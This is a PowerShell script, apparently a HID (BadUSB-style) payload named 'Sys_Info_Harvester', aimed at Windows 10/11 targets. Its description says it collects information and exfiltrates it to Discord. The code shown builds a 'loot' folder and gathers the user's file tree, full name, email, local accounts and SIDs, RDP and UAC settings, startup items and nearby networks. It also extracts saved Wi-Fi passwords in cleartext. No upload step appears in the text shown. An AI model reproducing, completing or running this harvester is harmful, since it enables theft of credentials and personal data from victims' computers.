######################################################################################################################################################################
#                                             |                                                                   |             .'''''.        ..||..'''''''...      #
# -Title     :Sys_Info_Harvester              |                                                                   |            / ##### \       : ||            ''.   #
# -Author    :ItsIsaac                        |                                                                   |           | ## # ## |      :.||...''''''....  '. #
# -Version   :1.0                             |                                                                   |           | #  #  # |        ||             '''' &
# -Category  :System/ User Info Grab          |       .___  __           .___                                     |            \ ##### /     /| < _>                 #
# -Target    :W 10/11                         |       |   |/  |_  ______ |   | ___________  _____    ____         |             \ ### /     / |/ < _>                #
# -Mode:     :HID                             |       |   \   __\/  ___/ |   |/  ___/\__  \ \__  \ _/ ___\        |           ..''   ''... /  |  < _>                #
#                                             |       |   ||  |  \___ \  |   |\___ \  / __ \_/ __ \\  \___        |         .'            /   | /||                  #
#                                             |       |___||__| /____  > |___/____  >(____  (____  /\___  >       |         '                 |/ ||                  #
#                                             |                      \/           \/      \/     \/     \/        |         |   |     '..     |  ||                  # 
#                                             |                                                                   |         |   |     |  '...''  ||                  #
#_____________________________________________|___________________________________________________________________|         |  |       |         ||                  #
#                                                                                                                 |          \ |       |         ||                  # 
#                                                                                                                 |          |\|       |         ||                  #
#                                                                                                                 |          \|         |        ||                  #
#                                                                                                                 |           |         |        ||                  #
#  -github.com/ibeihoffer                                                                                         |           |         |        ||                  #
#  -linked.com/in/ibeihoffer                                                                                      |          |           |       ||                  #
#                                                                                                                 |        __|           |__     ||                  #
#                                                                                                                 |       /   '.........'   \    ||                  #
#                                                                                                                 |        ''''''     ''''''     ##                  #
######################################################################################################################################################################                                                                                                                              

<#
.DESCRIPTION
        This program gathers system and user information from target Windows PC. Gathered information is formated and output to a file. That file is then exfiltrated
        to cloud storage via Discord. This program was influenced by various other programs and research.
#>

######################################################################################################################################################################

# Create loot folder, file, and zip

$FolderName = "$env:USERNAME-$(get-date -f 'M/d/yyyy h:mmtt')_harvester"

$FileName = "$FolderName.txt"

$ZipFile = "$FolderName.zip"

New-Item -Path $env:tmp/$FolderName -ItemType Directory

######################################################################################################################################################################

#Discord access token (not needed in ps1?)

#$dc = ""

######################################################################################################################################################################

# Recon all user directories (/a=parsing? /f=full directory?)

tree $env:USERPROFILE /a /f >> $env:TEMP\$FolderName\FileTree.txt

######################################################################################################################################################################

function Get-fullName {

    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")

        if($fullName -gt $null) {

                 return $fullName
 
        }else{
                 Write-Host("No full name available for...$env:UserName")
    } 

}

$fullName = Get-fullName

######################################################################################################################################################################

function Get-Email {

    $Email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName

        if($Email -gt $null) {

            return $Email

        }else{

            Write-Host("No email found for....$env:UserName")
        }
            
}

$Email = Get-Email

######################################################################################################################################################################

#Local user(s) account, name, and security id:

Get-WmiObject -Class Win32_UserAccount | Format-Table Domain, Name, @{N='Account';E={$PSItem.Caption}}, FullName, SID | Out-String

######################################################################################################################################################################

#Local Security Authority Subsystem Service state:
#lsass takes care of security policy for the OS

######################################################################################################################################################################

function RDP-Status {

    if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
	    return "RDP is Enabled" 
    } else {
	    return "RDP is NOT Enabled" 
    }

}

$RDP = RDP-Status

######################################################################################################################################################################

#UAC State:
#Referenced I-Am-Jakoby
#Need further understanding

Function Get-RegistryValue($key, $value) {  (Get-ItemProperty $key $value).$value }

$Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" 
$ConsentPromptBehaviorAdmin_Name = "ConsentPromptBehaviorAdmin" 
$PromptOnSecureDesktop_Name = "PromptOnSecureDesktop" 

$ConsentPromptBehaviorAdmin_Value = Get-RegistryValue $Key $ConsentPromptBehaviorAdmin_Name 
$PromptOnSecureDesktop_Value = Get-RegistryValue $Key $PromptOnSecureDesktop_Name

If($ConsentPromptBehaviorAdmin_Value -Eq 0 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Never notIfy" }
 
ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "NotIfy me only when apps try to make changes to my computer(do not dim my desktop)" } 

ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "NotIfy me only when apps try to make changes to my computer(default)" }
 
ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 2 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Always notIfy" }
 
Else{ $UAC = "Unknown" }

######################################################################################################################################################################

#Contents of startup folder

function StartUp {

$StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup"))).Name

    if($StartUp -gt $null) {

        return $StartUp

    }else{
        
        Write-Host("It appears there is nothing in the startup folder..")

    }

}

$StartUp = StartUp

######################################################################################################################################################################

#Wifi networks nearby or notify wifi interface is down.

function NearbyWifi {

    $NearbyWifi = (netsh wlan show networks mode=Bssid)

        if($NearbyWifi -gt $null) {

            return $NearbyWifi

        }elseif($NearbyWifi -eq ("*powered down and doesn't support*")){

            Write-Host("`nInterface Name: Wi-Fi`nThe wireless local area network interface is powered down and doesn't support the requested operation.")

        }else{

            Write-Host("No nearby wifi networks detected.")

        }

}

$NearbyWifi = NearbyWifi

######################################################################################################################################################################

#History of wifi network profiles and passwords
#referenced I-Am-Jakoby

$WifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String

######################################################################################################################################################################
